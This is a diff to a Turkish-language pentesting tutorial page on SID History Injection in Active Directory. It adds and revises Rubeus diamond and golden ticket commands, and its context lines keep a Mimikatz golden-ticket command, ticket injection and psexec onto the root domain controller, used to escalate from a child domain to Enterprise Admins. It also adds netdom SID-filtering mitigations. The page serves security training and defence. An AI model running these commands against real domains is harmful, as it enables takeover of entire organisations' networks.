@@ -4,17 +4,45 @@
 
 ## SID History Injection Attack
 
-**SID History Injection Attack**'ın odak noktası, **kullanıcıların alanlar arasında göçünü** sağlarken, eski alan kaynaklarına erişimin devamını temin etmektir. Bu, kullanıcının önceki Güvenlik Tanımlayıcısını (SID) yeni hesabının SID Geçmişine **ekleyerek** gerçekleştirilir. Özellikle, bu süreç, ana alandan yüksek ayrıcalıklı bir grubun (örneğin, Enterprise Admins veya Domain Admins) SID'sini SID Geçmişine ekleyerek yetkisiz erişim sağlamak için manipüle edilebilir. Bu istismar, ana alandaki tüm kaynaklara erişim sağlar.
+**SID History Injection Attack**'ın odak noktası, **kullanıcıların alanlar arasında göçünü** sağlarken, eski alan kaynaklarına erişimin devamını temin etmektir. Bu, kullanıcının önceki Güvenlik Tanımlayıcısının (SID) yeni hesabının SID Geçmişine **dahil edilmesiyle** gerçekleştirilir. Özellikle, bu süreç, ana alandan yüksek ayrıcalıklı bir grubun (örneğin, Enterprise Admins veya Domain Admins) SID'sini SID Geçmişine ekleyerek yetkisiz erişim sağlamak için manipüle edilebilir. Bu istismar, ana alandaki tüm kaynaklara erişim sağlar.
 
 Bu saldırıyı gerçekleştirmek için iki yöntem vardır: ya bir **Golden Ticket** ya da bir **Diamond Ticket** oluşturmak.
 
 **"Enterprise Admins"** grubunun SID'sini belirlemek için, önce kök alanın SID'sini bulmak gerekir. Tanımlamanın ardından, Enterprise Admins grup SID'si kök alanın SID'sine `-519` eklenerek oluşturulabilir. Örneğin, kök alan SID'si `S-1-5-21-280534878-1496970234-700767426` ise, "Enterprise Admins" grubunun sonuçta elde edilen SID'si `S-1-5-21-280534878-1496970234-700767426-519` olacaktır.
 
-Ayrıca **Domain Admins** gruplarını da kullanabilirsiniz, bu grup **512** ile biter.
+Ayrıca, **512** ile biten **Domain Admins** gruplarını da kullanabilirsiniz.
 
-Diğer bir alanın (örneğin "Domain Admins") grubunun SID'sini bulmanın başka bir yolu:
-```powershell
+Diğer bir alanın (örneğin "Domain Admins") grubunun SID'sini bulmanın bir başka yolu:
+```bash
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
+```
+> [!WARNING]
+> SID geçmişini bir güven ilişkisi içinde devre dışı bırakmanın bu saldırının başarısız olmasına neden olabileceğini unutmayın.
+
+[**docs**](https://technet.microsoft.com/library/cc835085.aspx) göre:
+- **Orman güvenlerinde SIDHistory'yi devre dışı bırakma** netdom aracı kullanılarak (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
+- **Dış güvenlere SID Filtreleme Karantinası uygulama** netdom aracı kullanılarak (`netdom trust /domain: /quarantine:yes on the domain controller`)
+- **Tek bir orman içindeki alan güvenlerine SID Filtreleme uygulamak** önerilmez çünkü bu desteklenmeyen bir yapılandırmadır ve kırıcı değişikliklere neden olabilir. Eğer bir orman içindeki bir alan güvenilir değilse, o ormanın üyesi olmamalıdır. Bu durumda, güvenilir ve güvenilir olmayan alanların ayrı ormanlara bölünmesi ve burada SID Filtrelemenin bir interforest güvenine uygulanması gereklidir.
+
+Bununla ilgili daha fazla bilgi için bu gönderiyi kontrol edin: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
+
+### Diamond Ticket (Rubeus + KRBTGT-AES256)
+
+Bunu en son denediğimde **`/ldap`** argümanını eklemem gerekti.
+```bash
+# Use the /sids param
+Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap
+
+# Or a ptt with a golden ticket
+## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
+## The /printcmd option will print the complete command if later you want to generate a token offline
+Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd
+
+#e.g.
+
+execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domain:current.domain.local /sid:S-1-21-19375142345-528315377-138571287 /rc4:12861032628c1c32c012836520fc7123 /sids:S-1-5-21-2318540928-39816350-2043127614-519 /ptt /ldap /nowrap /printcmd
+
+# You can use "Administrator" as username or any other string
 ```
 ### Golden Ticket (Mimikatz) ile KRBTGT-AES256
 ```bash
@@ -39,16 +67,7 @@ Daha fazla bilgi için golden ticket'lar hakkında kontrol edin:
 golden-ticket.md
 {{#endref}}
 
-### Diamond Ticket (Rubeus + KRBTGT-AES256)
-```powershell
-# Use the /sids param
-Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap
 
-# Or a ptt with a golden ticket
-Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt
-
-# You can use "Administrator" as username or any other string
-```
 Daha fazla bilgi için diamond ticket'lar hakkında kontrol edin:
 
 {{#ref}}
@@ -59,7 +78,7 @@ diamond-ticket.md
 .\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
 ls \\mcorp-dc.moneycorp.local\c$
 ```
-Kompromize edilmiş alanın KRBTGT hash'ini kullanarak root veya Enterprise admin'e yükseltin:
+Kompromize edilmiş alanın KRBTGT hash'ini kullanarak kök veya Enterprise admin'e yükseltin:
 ```bash
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
 
@@ -99,14 +118,14 @@ export KRB5CCNAME=hacker.ccache
 # psexec in domain controller of root
 psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
 ```
-#### Otomatik olarak [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py) kullanarak
+#### Automatic using [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
 
-Bu, **çocuk alanından ebeveyn alanına yükselmeyi otomatikleştiren** bir Impacket betiğidir. Betiğin ihtiyaçları:
+Bu, **çocuk alanından ebeveyn alanına yükseltmeyi otomatikleştiren** bir Impacket betiğidir. Betik şunları gerektirir:
 
 - Hedef alan denetleyicisi
 - Çocuk alanındaki bir yönetici kullanıcısı için kimlik bilgileri
 
-Akış şu şekildedir:
+Akış şudur:
 
 - Ebeveyn alanının Enterprise Admins grubunun SID'sini alır
 - Çocuk alanındaki KRBTGT hesabının hash'ini alır
